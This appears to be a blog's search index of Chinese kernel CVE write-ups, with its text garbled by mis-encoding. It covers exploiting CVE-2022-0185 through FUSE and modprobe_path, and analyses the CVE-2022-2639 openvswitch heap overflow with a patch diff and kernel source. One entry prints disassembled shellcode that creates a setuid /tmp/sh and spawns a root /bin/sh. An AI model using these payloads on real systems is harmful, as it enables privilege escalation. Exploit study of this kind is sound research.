<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2022-0185çš„ä¸‰ç§åˆ©ç”¨æ–¹å¼(ä¸‰)</title>
    <url>/2022/12/05/CVE-2022-0185%E7%9A%84%E4%B8%89%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-%E4%B8%89/</url>
    <content><![CDATA[<p>Pipe_primitive ä¸ CVE-2022-0185 File System Context æ•´æ•°æº¢å‡ºæ¼æ´åˆ©ç”¨ã€‚</p>
<span id="more"></span>
]]></content>
      <categories>
        <category>cve å¤ç°</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-0185çš„ä¸‰ç§åˆ©ç”¨æ–¹å¼(äºŒ)</title>
    <url>/2022/12/05/CVE-2022-0185%E7%9A%84%E4%B8%89%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-%E4%BA%8C/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>CVE-2022-0185çš„ä¸‰ç§åˆ©ç”¨æ–¹å¼(ä¸€)</title>
    <url>/2022/12/05/CVE-2022-0185%E7%9A%84%E4%B8%89%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-%E4%B8%80/</url>
    <content><![CDATA[<p>CVE-2022-0185 çš„å‡ ç§åˆ©ç”¨æ–¹å¼å­¦ä¹ ï¼Œæœ¬ç¯‡ä¸ºç¬¬ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼šç»“åˆ FUSE ç¯¡æ”¹ modprobe_path å®Œæˆææƒã€‚</p>
<span id="more"></span>

<h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h1 id="FUSE"><a href="#FUSE" class="headerlink" title="FUSE"></a>FUSE</h1><p>FUSEï¼ˆFilesystem in Userspaceï¼‰æ˜¯ Linux çš„ä¸€é¡¹åŠŸèƒ½ï¼Œå¯ä»¥ä»ç”¨æˆ·ç©ºé—´å®ç°è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿã€‚å½“æ‚¨ä½¿ç”¨ CONFIG_FUSE_FS ç¼–è¯‘é€‰é¡¹æ„å»ºå†…æ ¸æ—¶ï¼Œå®ƒä¼šè¢«å¯ç”¨ã€‚é¦–å…ˆï¼Œè¯¥ç¨‹åºä½¿ç”¨ FUSE æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿã€‚å½“å¯¹ä½¿ç”¨ FUSE åˆ›å»ºçš„æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶æ‰§è¡Œæ“ä½œæ—¶ï¼Œå°†è°ƒç”¨ fuse_operations ä¸­å®šä¹‰çš„å¤„ç†ç¨‹åºã€‚é™¤äº†æ–‡ä»¶æ“ä½œçš„æ‰“å¼€ã€è¯»å–ã€å†™å…¥ã€å…³é—­ï¼Œç›®å½•è®¿é—®çš„ readdirã€mkdirã€chmodã€ioctlã€poll ç­‰ï¼Œæ‰€æœ‰çš„æ“ä½œéƒ½å¯ä»¥åœ¨ fuse_operations ä¸­ç‹¬ç«‹å®ç°ã€‚ä¸è¿‡ä¸€èˆ¬é¢˜ç›®ä¸­åªè¦å®ç°ä¸€ä¸ªèƒ½è§¦å‘çš„åŠŸèƒ½æ¥å¢å¤§æ¡ä»¶ç«äº‰çª—å£å’Œå®ç°åˆ©ç”¨å³å¯ã€‚å¦‚æ–‡ä»¶çš„æ‰“å¼€æˆ–è¯»å–å°±è¶³å¤Ÿã€‚å¦å¤–ï¼Œä¸ºäº†æ‰“å¼€ï¼Œéœ€è¦å®šä¹‰ä¸€ä¸ªè¿”å›æ–‡ä»¶æƒé™ç­‰ä¿¡æ¯çš„getattrå‡½æ•°ã€‚æ‰€ä»¥å®ç°ä¸€ä¸ª FUSE æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿéœ€è¦ï¼š</p>
<ol>
<li>ç¡®å®šæŒ‚è½½è·¯å¾„</li>
<li>å®šä¹‰å¹¶å®ç° fuse_operations</li>
</ol>
<h2 id="æé«˜æ¡ä»¶ç«äº‰çš„ç¨³å®šæ€§"><a href="#æé«˜æ¡ä»¶ç«äº‰çš„ç¨³å®šæ€§" class="headerlink" title="æé«˜æ¡ä»¶ç«äº‰çš„ç¨³å®šæ€§"></a>æé«˜æ¡ä»¶ç«äº‰çš„ç¨³å®šæ€§</h2><p>ç°åœ¨è®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•ä½¿ç”¨ FUSE æ¥ç¨³å®šæ¼æ´åˆ©ç”¨ã€‚</p>
<p>ä¸è¿‡åŸç†å’Œuserfaultfdæ˜¯å®Œå…¨ä¸€æ ·çš„ã€‚åœ¨ userfaultfd ä¸­ï¼Œé¡µé¢é”™è¯¯æ˜¯è°ƒç”¨ç”¨æˆ·ç«¯å¤„ç†ç¨‹åºçš„èµ·ç‚¹ï¼Œä½†åœ¨ FUSE ä¸­ï¼Œæ–‡ä»¶è¯»å–æ˜¯èµ·ç‚¹ã€‚</p>
<p>å¦‚æœä¸€ä¸ªFUSEå®ç°çš„æ–‡ä»¶åœ¨æ²¡æœ‰ MAP_POPULATE çš„æƒ…å†µä¸‹é€šè¿‡ mmap æ˜ å°„åˆ°å†…å­˜ï¼Œé‚£ä¹ˆåœ¨å¯¹è¯¥åŒºåŸŸè¿›è¡Œè¯»å†™æ—¶ä¼šå‡ºç°page faultï¼Œæœ€ç»ˆä¼šè°ƒç”¨ fuse_operations ä¸­çš„ readã€‚å¦‚æœä½ ä½¿ç”¨è¿™ä¸ªï¼Œä½ å¯ä»¥åœ¨å†…å­˜è¯»&#x2F;å†™å‘ç”Ÿçš„æ—¶æœºåˆ‡æ¢ä¸Šä¸‹æ–‡ï¼Œå°±åƒuserfaultfdä¸€æ ·ã€‚æ­¤æ—¶å¯ä»¥ç›´æ¥åœ¨å¯¹åº”çš„å›è°ƒå‡½æ•°ä¸­å®ç°æ“ä½œä¹Ÿå¯ä»¥é…åˆå…¶ä»–å­è¿›ç¨‹&#x2F;å­çº¿ç¨‹å®ç°ã€‚å…·ä½“çš„ç¤ºä¾‹å¯ä»¥å‚è€ƒ<a href="https://pawnyable.cafe/linux-kernel/LK04/fuse.html">FUSEã®åˆ©ç”¨ | PAWNYABLE!</a> æˆ–æœ¬æ–‡çš„åˆ©ç”¨æ–¹å¼ã€‚</p>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>å›é¡¾ä¸€ä¸‹æ¼æ´å³ï¼šåœ¨ kmalloc-4096 ä¸Šçš„æº¢å‡ºã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:0000000000400078 start:                                  ; DATA XREF: LOAD:0000000000400018â†‘o</span><br><span class="line">LOAD:0000000000400078                                         ; LOAD:00000000004000F5â†“o</span><br><span class="line">LOAD:0000000000400078                 lea     rdi, aTmpSh     ; &quot;/tmp/sh&quot;</span><br><span class="line">LOAD:000000000040007F                 mov     rsi, 241h</span><br><span class="line">LOAD:0000000000400086                 mov     rax, 2</span><br><span class="line">LOAD:000000000040008D                 syscall                 ; LINUX - sys_open</span><br><span class="line">LOAD:000000000040008F                 mov     rdi, rax</span><br><span class="line">LOAD:0000000000400092                 lea     rsi, qword_4000DD</span><br><span class="line">LOAD:0000000000400099                 mov     rdx, 0BAh</span><br><span class="line">LOAD:00000000004000A0                 mov     rax, 1</span><br><span class="line">LOAD:00000000004000A7                 syscall                 ; LINUX - sys_write</span><br><span class="line">LOAD:00000000004000A9                 mov     rax, 3</span><br><span class="line">LOAD:00000000004000B0                 syscall                 ; LINUX - sys_close</span><br><span class="line">LOAD:00000000004000B2                 lea     rdi, aTmpSh     ; &quot;/tmp/sh&quot;</span><br><span class="line">LOAD:00000000004000B9                 mov     rsi, 9EDh</span><br><span class="line">LOAD:00000000004000C0                 mov     rax, 5Ah ; &#x27;Z&#x27;</span><br><span class="line">LOAD:00000000004000C7                 syscall                 ; LINUX - sys_chmod</span><br><span class="line">LOAD:00000000004000C9                 xor     rdi, rdi</span><br><span class="line">LOAD:00000000004000CC                 mov     rax, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">LOAD:00000000004000D3                 syscall                 ; LINUX - sys_exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LOAD:0000000000400078 start:                                  ; DATA XREF: LOAD:0000000000400018â†‘o</span><br><span class="line">LOAD:0000000000400078                 xor     rdi, rdi</span><br><span class="line">LOAD:000000000040007B                 mov     rax, 69h ; &#x27;i&#x27;</span><br><span class="line">LOAD:0000000000400082                 syscall                 ; LINUX - sys_setuid</span><br><span class="line">LOAD:0000000000400084                 xor     rdi, rdi</span><br><span class="line">LOAD:0000000000400087                 mov     rax, 6Ah ; &#x27;j&#x27;</span><br><span class="line">LOAD:000000000040008E                 syscall                 ; LINUX - sys_setgid</span><br><span class="line">LOAD:0000000000400090                 lea     rdi, aBinSh     ; &quot;/bin/sh&quot;</span><br><span class="line">LOAD:0000000000400097                 push    0</span><br><span class="line">LOAD:0000000000400099                 mov     rdx, rsp</span><br><span class="line">LOAD:000000000040009C                 push    rdi</span><br><span class="line">LOAD:000000000040009D                 mov     rsi, rsp</span><br><span class="line">LOAD:00000000004000A0                 mov     rax, 3Bh ; &#x27;;&#x27;</span><br><span class="line">LOAD:00000000004000A7                 syscall                 ; LINUX - sys_execve</span><br><span class="line">LOAD:00000000004000A9                 mov     rax, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">LOAD:00000000004000B0                 syscall                 ; LINUX - sys_exit</span><br></pre></td></tr></table></figure>







<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1>]]></content>
      <categories>
        <category>cve å¤ç°</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
        <tag>FUSE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-2639</title>
    <url>/2022/12/02/CVE-2022-2639/</url>
    <content><![CDATA[<p>cve-2022-2639 openvswitch æ¨¡å— kmalloc-0x10000 å †æº¢å‡ºã€ç»“åˆ Pipe_Primitiveåˆ©ç”¨ã€‚</p>
<span id="more"></span>

<h1 id="æºç é˜…è¯»"><a href="#æºç é˜…è¯»" class="headerlink" title="æºç é˜…è¯»"></a>æºç é˜…è¯»</h1><p>æ•´ä½“æºç å¯ä»¥ç”¨ si è½½å…¥ï¼Œä¸¤è¾¹åŒæ—¶çœ‹æ•´ä½“é€»è¾‘å’Œå‡½æ•°å®ç°æ¯”è¾ƒæ–¹ä¾¿ã€‚ç„¶åadd allï¼Œè¿™æ—¶å€™åªéœ€è¦addç¬¬ä¸€å±‚å°±è¡Œäº†ï¼Œä¸è¦é€‰ä¸‹é¢çš„ï¼Œå¦åˆ™ si å°±ä¼šå› ä¸ºæºä»£ç è¿‡å¤šè€Œåˆ†æä¸äº†å¯„æ‰ã€‚</p>
<p><img src="/img/CVE-2022-2639/1.png" alt="image"></p>
<p>ç„¶åæ ¹æ®æƒ³è¦é˜…è¯»çš„ä½ç½®ï¼Œé€‰æ‹©é‚£ä¸ªå¯¹åº”çš„å°æ–‡ä»¶å¤¹ï¼Œç„¶åé€’å½’çš„addæ‰€æœ‰æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„ç¬¬äºŒä¸ªå¯¹å·è¦æ‰“ä¸Šã€‚å¦‚æœç¢°åˆ°æ‰¾ä¸åˆ°çš„ç»“æ„ä½“æˆ–è€…å…¶ä»–å®šä¹‰ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªåœ¨çº¿çš„ source æ‰¾åˆ°å¯¹åº”å…³ç³»ï¼Œç„¶åå†å›åˆ° si ä¸­ add è¯¥è·¯å¾„ä¸‹çš„æ–‡ä»¶ã€‚è¿™æ ·åœ¨ si ä¸­å°±èƒ½æ‰¾åˆ°äº†ã€‚å¦‚ï¼š <a href="https://elixir.bootlin.com/linux/v5.13/C/ident/nlattr">nlattr</a> ã€‚</p>
<p>æ‰¾åˆ°å®šä¹‰çš„ nlattrï¼š</p>
<p><img src="/img/CVE-2022-2639/2.png" alt="nlattr"></p>
<h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>æŸ¥çœ‹ patch:</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">diff --git a/net/openvswitch/flow_netlink.c b/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="comment">index 7176156d38443c..4c09cf8a0ab2dc 100644</span></span><br><span class="line"><span class="comment">--- a/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="comment">+++ b/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="meta">@@ -2465,7 +2465,7 @@</span> static struct nlattr *reserve_sfa_size(struct sw_flow_actions **sfa,</span><br><span class="line"> 	new_acts_size = max(next_offset + req_size, ksize(*sfa) * 2);</span><br><span class="line"> </span><br><span class="line"> 	if (new_acts_size &gt; MAX_ACTIONS_BUFSIZE) &#123;</span><br><span class="line"><span class="deletion">-		if ((MAX_ACTIONS_BUFSIZE - next_offset) &lt; req_size) &#123;</span></span><br><span class="line"><span class="addition">+		if ((next_offset + req_size) &gt; MAX_ACTIONS_BUFSIZE) &#123;</span></span><br><span class="line"> 			OVS_NLERR(log, &quot;Flow action size exceeds max %u&quot;,</span><br><span class="line"> 				  MAX_ACTIONS_BUFSIZE);</span><br><span class="line"> 			return ERR_PTR(-EMSGSIZE);</span><br></pre></td></tr></table></figure>



<h2 id="reserve-sfa-size"><a href="#reserve-sfa-size" class="headerlink" title="reserve_sfa_size"></a>reserve_sfa_size</h2><p>æ‰¾åˆ°å¯¹åº”å‡½æ•°ï¼Œçœ‹ä¸€ä¸‹æ¼æ´æˆå› ï¼š</p>
<p><img src="/img/CVE-2022-2639/3.png" alt="3"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ACTIONS_BUFSIZE	(32 * 1024)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> next_offset = offsetof(<span class="keyword">struct</span> sw_flow_actions, actions) + (*sfa)-&gt;actions_len;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> req_size = NLA_ALIGN(attr_len);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥æ³¨æ„åˆ°å›¾ä¸­çº¢è‰²æ¡†å†…ä»£ç ä¸­ï¼Œç­‰å¼å·¦è¾¹ <code>next_offset</code> ä¸ºæœ‰ç¬¦å·æ•°ï¼Œè€Œå³è¾¹çš„ <code>req_size</code> ä¸ºæ— ç¬¦å·æ•°ã€‚å·¦ä¾§ç›¸å‡åå¦‚æœç»“æœä¸ºè´Ÿæ•°ï¼Œ<strong>åˆ™åœ¨ä¸æ— ç¬¦å·æ¯”è¾ƒæ—¶ä¼šè¢«å¼ºåˆ¶è½¬æ¢ä¸ºæ— ç¬¦å·æ•°è€Œå˜æˆéå¸¸å¤§çš„æ­£æ•°</strong>ï¼Œä»è€Œç»•è¿‡ä¸‹é¢çš„ exceeds çš„ check ç»§ç»­ä¸‹é¢çš„é€»è¾‘ã€‚</p>
<p><code>MAX_ACTIONS_BUFSIZE</code> ä¸º 0x8000ï¼Œæ‰€ä»¥å½“ <code>next_offset</code> çš„å€¼å¤§äºè¯¥å€¼æ—¶ï¼Œå°±ä¼šå‘ç”Ÿå‰é¢æåˆ°çš„æƒ…å†µã€‚</p>
<p>ç»§ç»­å‘ä¸‹åˆ†æã€‚</p>
<p>â‘  <code>new_acts_size</code> &#x3D; <code>MAX_ACTIONS_BUFSIZE</code>	&#x3D; 0x8000ï¼Œ2362è¡Œæ ¹æ®è¯¥ size è¿›è¡Œ <code>alloc</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> sw_flow_actions *<span class="title function_">nla_alloc_flow_actions</span><span class="params">(<span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sw_flow_actions</span> *<span class="title">sfa</span>;</span></span><br><span class="line"></span><br><span class="line">	WARN_ON_ONCE(size &gt; MAX_ACTIONS_BUFSIZE);</span><br><span class="line"></span><br><span class="line">	sfa = kmalloc(<span class="keyword">sizeof</span>(*sfa) + size, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!sfa)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	sfa-&gt;actions_len = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> sfa;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sw_flow_actions</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">	<span class="type">size_t</span> orig_len;	<span class="comment">/* From flow_cmd_new netlink actions size */</span></span><br><span class="line">	u32 actions_len;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> <span class="title">actions</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">sizeof</span>(<span class="keyword">struct</span> sw_flow_actions) = <span class="number">0x20</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆ <code>kmalloc</code> å¤§å°ä¸º <code>sw_flow_actions</code> ç»“æ„ä½“çš„å¤§å°ä¸ <code>new_acts_size</code> çš„å’Œï¼›<br>â‘¡ å›åˆ°æ¼æ´å‡½æ•°ï¼Œå°†ä¼ å…¥çš„ <code>sfa-&gt;actions</code> å¤„çš„å†…å®¹å¤åˆ¶åˆ°æ–°ç”³è¯·çš„ <code>acts-&gt;actions</code> å¤„ï¼›<br>â‘¢ ç»è¿‡ä¸€äº›å¯¹ <code>acts</code> çš„åˆå§‹åŒ–ï¼Œè¿”å› <code>acts+next_offset</code>ã€‚</p>
<h2 id="copy-action"><a href="#copy-action" class="headerlink" title="copy_action"></a>copy_action</h2><p>é€šè¿‡ si çš„ Relationï¼Œä¹Ÿèƒ½çœ‹åˆ°è°ƒç”¨å…³ç³»ï¼š</p>
<p><img src="/img/CVE-2022-2639/4.png"></p>
<p><code>copy_action</code> å‡½æ•°ä¸­ï¼š</p>
<p><img src="/img/CVE-2022-2639/5.png"></p>
<p>è¿”å›å€¼ <code>to</code> å³ä¸º <code>acts + next_offset</code>ï¼Œè€Œ <code>acts</code> çš„æ•´ä¸ªå¤§å°æ‰ä¸º 0x8000+0x20ï¼Œæ‰€ä»¥ä¸‹é¢çš„ <code>memcpy</code> å³å‘ç”Ÿäº†å †è¶Šç•Œå†™ã€‚ </p>
<p>ä½†æ˜¯ç”±äºå¯¹é½ï¼Œå†…æ ¸å¹¶ä¸ä¼šåˆ†é… 0x8020 å¤§å°çš„ slabï¼Œè€Œæ˜¯åˆ†é…äº† 0x10000 çš„ slabã€‚ </p>
<p>æ ¹æ®å‚è€ƒæ–‡ç« ä¸­çš„æè¿°ï¼Œopenvswitch é€šè¿‡ netlink è¿›è¡Œé€šä¿¡ï¼ˆçœ‹æºç ç›®å½•å’Œæ–‡ä»¶åä¹Ÿæœ‰å‘ç°ï¼‰ã€‚æ ¹æ® man pages çš„æè¿°ï¼š</p>
<blockquote>
<p>Netlink is used to transfer information between the kernel and user-space processes.  It consists of a standard sockets-based interface for user space processes and an internal kernel API for kernel modules.</p>
</blockquote>
<p>æœ€åˆå¼€å‘æ˜¯ä¸ºäº†å…‹æœ ioctl çš„é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œå†…æ ¸å¯ä»¥ä½¿ç”¨ netlink æ¥æ”¶å˜é•¿çš„å‚æ•°ã€‚å‡ ä¹æ‰€æœ‰ Linux ç½‘ç»œç®¡ç†éƒ½ä½¿ç”¨äº† netlinkï¼Œä¾‹å¦‚ iproute2 ä¸­çš„ip &#x2F; ss &#x2F; bridgeã€‚æ›´å¤šå…³äº Netlink çš„ä¸œè¥¿åç»­æ•´ç†å¥½ CVE-2022-1015 çš„åšå®¢åç›´æ¥æŒ‚ä¸ªé“¾æ¥è¿‡å»~~</p>
<p>è¿™ä¹‹ä¸­ç”¨åˆ°äº†åä¸º <code>nlattr</code> çš„ç»“æ„ä½“ï¼š</p>
<p><img src="/img/CVE-2022-2639/6.png"></p>
<p>è¯¥ç»“æ„ä½“å¤§å°ä¸º4å­—èŠ‚ã€‚len å­—æ®µä¸º <code>u16</code>ï¼Œä¹Ÿå°±æ˜¯æ­¤æ—¶ <code>nla_len</code> æœ€å¤§ä¸º 0xffffï¼Œ<code>memcpy</code> çš„ç¬¬äºŒä¸ªå‚æ•° <code>from</code> çš„ <code>payload</code> æœ€å¤šå°±æ˜¯ 0xffff å­—èŠ‚ã€‚è€Œå‰é¢çš„ <code>kmalloc</code> çš„ slab ä¸º 0x10000ã€‚å¹¶ä¸èƒ½ç›´æ¥ oob writeã€‚</p>
<p>ä¸Šé¢æåˆ° openvswitch æ¨¡å—ä½¿ç”¨ netlink é€šä¿¡ï¼Œé‚£ä¸€å®šä¼šå…ˆéµå®ˆ netlink çš„é€šä¿¡çº¦å®šï¼ˆä¹Ÿå°±æ˜¯ä¸€äº›æ•°æ®ç»“æ„çš„ä½¿ç”¨ï¼‰ï¼Œå³ netlink çš„æ¶ˆæ¯å¤´ï¼š<code>nlmsghdr</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> &#123;</span></span><br><span class="line">	__u32		nlmsg_len;	<span class="comment">// æ•´ä¸ªæ¶ˆæ¯çš„é•¿åº¦, åŒ…æ‹¬ Netlink æ¶ˆæ¯å¤´æœ¬èº«</span></span><br><span class="line">	__u16		nlmsg_type;	<span class="comment">// ç‰¹å®šæ¥å£çš„æ¶ˆæ¯ç±»å‹</span></span><br><span class="line">	__u16		nlmsg_flags;<span class="comment">// æ¶ˆæ¯ç±»å‹çš„é¢å¤–ä¿¡æ¯</span></span><br><span class="line">	__u32		nlmsg_seq;	<span class="comment">/* Sequence number */</span></span><br><span class="line">	__u32		nlmsg_pid;	<span class="comment">/* Sending process port ID */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/7.png"></p>
<p>netlink åˆæœ‰å¾ˆå¤šç§ç±»ï¼Œåœ¨ netlink.h ä¸­ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_ROUTE		0	<span class="comment">/* Routing/device hook				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_UNUSED		1	<span class="comment">/* Unused number				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_USERSOCK	2	<span class="comment">/* Reserved for user mode socket protocols 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_FIREWALL	3	<span class="comment">/* Unused number, formerly ip_queue		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_SOCK_DIAG	4	<span class="comment">/* socket monitoring				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_NFLOG		5	<span class="comment">/* netfilter/iptables ULOG */</span></span></span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_IP6_FW		13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_DNRTMSG		14	<span class="comment">/* DECnet routing messages */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_KOBJECT_UEVENT	15	<span class="comment">/* Kernel messages to userspace */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_GENERIC		16</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>openvswitch å±äº <code>NETLINK_GENERIC</code>ã€‚å› æ­¤åœ¨ <code>struct nlmsghdr</code> ä¸­è¿˜éœ€è¦ <code>struct genlmsghdr</code>ï¼›åœ¨è¿™åé¢æ‰æ˜¯çœŸæ­£ä¼ é€’ç»™ openvswitch çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ <code>struct nlattr</code>ã€‚<strong>å³ <code>struct nlmsghdr -&gt; struct genlmsghdr -&gt; struct nlattr</code> ä¸‰å±‚æ•°æ®ç»“æ„</strong>ã€‚å‰é¢çš„æ¼æ´ä½äºæ‹·è´ flow actions çš„åœºæ™¯ä¸­ï¼Œè€Œ flow actions åˆæ˜¯ä¸» <code>struct nlattr</code>ä¸­çš„ä¸€ä¸ªå­ <code>struct nlattr</code>ã€‚æ‰€ä»¥å±‚å±‚åµŒå¥—ä¸‹æ¥ï¼Œæœ€å¤–å±‚çš„ <code>nlattr</code> çš„é•¿åº¦éƒ½ä¸è¶…è¿‡ 0xffffï¼Œåé¢çš„å­ <code>nlattr</code> æ›´ä¸èƒ½è¾¾åˆ°æº¢å‡º 0x10000 çš„è¦æ±‚ã€‚</p>
<h2 id="ovs-nla-copy-actions"><a href="#ovs-nla-copy-actions" class="headerlink" title="__ovs_nla_copy_actions"></a>__ovs_nla_copy_actions</h2><p>ç»§ç»­çœ‹ <code>copy_action</code> çš„ä¸Šå±‚å‡½æ•° <code>__ovs_nla_copy_actions</code>ï¼š</p>
<p><img src="/img/CVE-2022-2639/8.png"></p>
<p>å…¶ä¸­æœ‰å¦‚ä¸‹æ•°ç»„æ¥æè¿°æ¯ä¸ª <code>ACTION attr</code> çš„é•¿åº¦ï¼š</p>
<p><img src="/img/CVE-2022-2639/9.png"></p>
<p>æ ¹æ®æ³¨é‡Šï¼Œ -1 è¡¨ç¤ºå˜é•¿ï¼Œå…¶ä»–ç›´æ¥èµ‹å€¼çš„è‡ªç„¶å°±æ˜¯å®šé•¿çš„äº†ã€‚å¯¹äºå®šé•¿çš„ <code>ACTION</code>ï¼Œä¾‹å¦‚ä»£ç ä¸­çš„ <code>OVS_ACTION_ATTR_PUSH_MPLSã€OVS_ACTION_ATTR_PUSH_VLAN</code> ç­‰ï¼Œåªè¿›è¡Œäº†ä¸€äº›ç®€å•çš„å­—æ®µåˆ¤æ–­å°±è·³å‡º switchï¼Œè¿›å…¥åˆ° <code>copy_action</code> ä¸­ï¼š</p>
<p><img src="/img/CVE-2022-2639/10.png"></p>
<p><img src="/img/CVE-2022-2639/11.png"></p>
<p>æ³¨æ„åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªéå¸¸é‡è¦çš„æ ‡è¯†ï¼š<code>skip_copy</code>ï¼Œä»–åœ¨è¿›å…¥æ•´ä¸ª switch ä¹‹å‰è¢«èµ‹å€¼ä¸º <code>false</code>ã€‚è€Œåœ¨ä¸Šè¿°å¯¹å¦‚<code>OVS_ACTION_ATTR_PUSH_MPLS</code> ç­‰å®šé•¿ <code>ACTION</code> çš„å¤„ç†ä¸­ï¼Œå¹¶æœªä¿®æ”¹è¯¥å€¼ã€‚è€Œåœ¨å¤„ç†å…¶ä»–èµ‹å€¼ä¸º -1 å³å˜é•¿çš„<code>ACTION</code>ä¸­ï¼Œä¼šå°†å…¶èµ‹å€¼ä¸º <code>true</code>ï¼š</p>
<p><img src="/img/CVE-2022-2639/12.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ovs_ct_copy_action</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="type">const</span> <span class="keyword">struct</span> nlattr *attr,</span></span><br><span class="line"><span class="params">		       <span class="type">const</span> <span class="keyword">struct</span> sw_flow_key *key,</span></span><br><span class="line"><span class="params">		       <span class="keyword">struct</span> sw_flow_actions **sfa,  <span class="type">bool</span> <span class="built_in">log</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ovs_conntrack_info</span> <span class="title">ct_info</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *helper = <span class="literal">NULL</span>;</span><br><span class="line">	u16 family;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">	err = parse_ct(attr, &amp;ct_info, &amp;helper, <span class="built_in">log</span>);</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">	err = ovs_nla_add_action(sfa, OVS_ACTION_ATTR_CT, &amp;ct_info,<span class="keyword">sizeof</span>(ct_info), <span class="built_in">log</span>);</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

